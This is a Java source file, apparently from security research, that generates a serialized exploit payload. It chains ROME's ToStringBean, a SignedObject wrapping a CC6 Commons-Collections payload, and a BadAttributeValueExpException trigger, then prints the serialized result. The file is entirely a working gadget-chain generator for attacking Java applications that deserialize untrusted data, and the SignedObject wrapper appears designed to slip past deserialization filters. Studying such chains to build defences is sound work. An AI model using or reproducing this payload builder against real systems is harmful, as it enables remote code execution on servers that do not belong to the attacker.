package com.example;

import com.sun.syndication.feed.impl.ToStringBean;
import java.security.Signature;

import javax.management.BadAttributeValueExpException;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.SignedObject;

public class RomeBadChain {
    public static void main(String[] args) throws Exception {

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject=new SignedObject(CC6EXP.getPayload(), kp.getPrivate(), Signature.getInstance("DSA"));

        ToStringBean toStringBean = new ToStringBean(SignedObject.class, signedObject);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(toStringBean);

        String barr = Utils.Serialize(badAttributeValueExpException);
        System.out.println(barr);
//        Utils.UnSerialize(barr);
    }
}
